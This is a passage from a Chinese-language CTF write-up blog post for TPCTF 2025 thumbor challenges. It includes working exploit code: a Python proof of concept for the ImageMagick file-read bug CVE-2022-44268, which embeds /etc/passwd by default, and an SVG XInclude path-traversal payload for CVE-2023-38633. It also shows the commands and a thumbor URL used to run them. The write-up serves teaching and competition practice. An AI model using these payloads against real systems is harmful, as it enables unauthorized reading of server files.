class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">from_filename, to_filename, read_filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> to_filename:</span><br><span class="line">        logging.error(<span class="string">&#x27;you must specify a output filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(to_filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(png.signature)</span><br><span class="line">        <span class="keyword">if</span> from_filename:</span><br><span class="line">            p = png.Reader(filename=from_filename)</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> p.chunks():</span><br><span class="line">                <span class="keyword">if</span> k != <span class="string">b&#x27;IEND&#x27;</span>:</span><br><span class="line">                    png.write_chunk(f, k, v)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            png.write_chunk(f, <span class="string">b&#x27;IHDR&#x27;</span>, IHDR)</span><br><span class="line">            png.write_chunk(f, <span class="string">b&#x27;IDAT&#x27;</span>, IDAT)</span><br><span class="line"></span><br><span class="line">        png.write_chunk(f, <span class="string">b&quot;tEXt&quot;</span>, <span class="string">b&quot;profile\x00&quot;</span> + read_filename.encode())</span><br><span class="line">        png.write_chunk(f, <span class="string">b&#x27;IEND&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;POC for CVE-2022-44268&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;action&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, choices=(<span class="string">&#x27;generate&#x27;</span>, <span class="string">&#x27;parse&#x27;</span>))</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--input&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;input filename&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;output filename&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-r&#x27;</span>, <span class="string">&#x27;--read&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;target file to read&#x27;</span>, default=<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.action == <span class="string">&#x27;generate&#x27;</span>:</span><br><span class="line">        write(args.<span class="built_in">input</span>, args.output, args.read)</span><br><span class="line">    <span class="keyword">elif</span> args.action == <span class="string">&#x27;parse&#x27;</span>:</span><br><span class="line">        read(args.<span class="built_in">input</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.error(<span class="string">&quot;bad action&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 123.py generate -o poc.png -r /etc/passwd</span><br></pre></td></tr></table></figure>

<p>然后我们把生成的poc.png放到vps的网站目录下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">156.238.233.113:8800/thumbor/unsafe/450x/156.238.233.113/poc.png</span><br></pre></td></tr></table></figure>

<img src="/2025/03/30/TPCTF2025-wp/image-20250329161032473.png" class="" title="This is an example image">

<p>给这个图片下载下来。然后我们提取图片中的内容！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 123.py parse -i poc11.png</span><br></pre></td></tr></table></figure>

<img src="/2025/03/30/TPCTF2025-wp/image-20250329161140805.png" class="" title="This is an example image">

<p>拿下了。。。那么接下来直接搞flag的。</p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250329162020388.png" class="" title="This is an example image">

<p>十六进制解码一下获取flag！！</p>
<h2 id="thumbor-2"><a href="#thumbor-2" class="headerlink" title="thumbor 2"></a>thumbor 2</h2><p>先看看DockerFile，发现跟thumbor1的没啥大区别？这里的dockerfile中多了一个imagemagick。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FROM pandoc/core:2.18-ubuntu</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y libexiv2-dev libboost-python-dev exiftool imagemagick git python3-pip libcurl4-openssl-dev libssl-dev</span><br><span class="line">RUN git clone --depth 1 https://gerrit.wikimedia.org/r/operations/software/thumbor-plugins</span><br><span class="line">RUN pip install -r thumbor-plugins/requirements.txt</span><br><span class="line">RUN dd if=thumbor-plugins/README.md of=thumbor.conf bs=1 count=1947 skip=610</span><br><span class="line">RUN echo TPCTF&#123;...&#125; &gt; /flag</span><br><span class="line">ENV PYTHONPATH=/data/thumbor-plugins</span><br><span class="line">ENTRYPOINT thumbor --port 8800 --conf=thumbor.conf -a wikimedia_thumbor.app.App</span><br></pre></td></tr></table></figure>

<p>我们先进docker把thumbor-plugins文件夹拉出来看看源码。</p>
<p>这道题的考点在这篇文章：<a target="_blank" rel="noopener" href="https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/">https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/</a></p>
<figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(255,204,204);&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xi:include</span></span></span><br><span class="line"><span class="tag">      <span class="attr">href</span>=<span class="string">&quot;.?../../../../../../../flag&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">encoding</span>=<span class="string">&quot;ASCII&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xi:fallback</span>&gt;</span>file not found<span class="tag">&lt;/<span class="name">xi:fallback</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2025/03/30/TPCTF2025-wp/image-20250330160754286.png" class="" title="This is an example image">



<h2 id="Are-you-incognito"><a href="#Are-you-incognito" class="headerlink" title="Are you incognito?"></a>Are you incognito?</h2><p>好像是个0day，这里给出wp</p>
<p><a target="_blank" rel="noopener" href="https://z3n1th1.com/2025/03/tpctf2025-writeup/#are-you-incognito">https://z3n1th1.com/2025/03/tpctf2025-writeup/#are-you-incognito</a></p>
<p><a target="_blank" rel="noopener" href="https://ouuan.moe/post/2025/03/tpctf-2025#are-you-incognito-3-solves">https://ouuan.moe/post/2025/03/tpctf-2025#are-you-incognito-3-solves</a></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Meteor_Kai</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://meteorkai.github.io/2025/03/30/TPCTF2025-wp/">http://meteorkai.github.io/2025/03/30/TPCTF2025-wp/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>CyberSecurity brings me great joy!</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/wp/"># wp</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2025/03/31/Next-js%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2025-29927/">Next.js中间件鉴权绕过漏洞复现(CVE-2025-29927)</a>
            
            
            <a class="next" rel="next" href="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/">CVE-2025-24813 Tomcat RCE 分析复现</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Meteor_Kai | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>